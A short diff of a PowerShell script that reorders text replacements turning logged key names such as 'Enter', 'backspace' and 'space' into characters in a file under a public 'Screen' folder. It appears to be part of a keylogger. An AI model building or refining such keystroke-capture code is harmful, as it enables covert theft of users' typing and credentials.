@@ -50,8 +50,8 @@ while($key -eq $false){
 }
 if ($date -eq 59){
 (Get-Content -path C:\Users\Public\Documents\Screen\test.txt -Raw) -replace "Enter" ,"`n" | Set-Content -Path C:\Users\Public\Documents\Screen\test.txt
-(Get-Content -path C:\Users\Public\Documents\Screen\test.txt -Raw) -replace "space" ," " | Set-Content -Path C:\Users\Public\Documents\Screen\test.txt
 (Get-Content -path C:\Users\Public\Documents\Screen\test.txt -Raw) -replace "backspace" ,"`b" | Set-Content -Path C:\Users\Public\Documents\Screen\test.txt
+(Get-Content -path C:\Users\Public\Documents\Screen\test.txt -Raw) -replace "space" ," " | Set-Content -Path C:\Users\Public\Documents\Screen\test.txt
 (Get-Content -path C:\Users\Public\Documents\Screen\test.txt -Raw) -replace "°" ,"" | Set-Content -Path C:\Users\Public\Documents\Screen\test.txt
 
  $allfiles += "C:\Users\Public\Documents\Screen\test.txt"
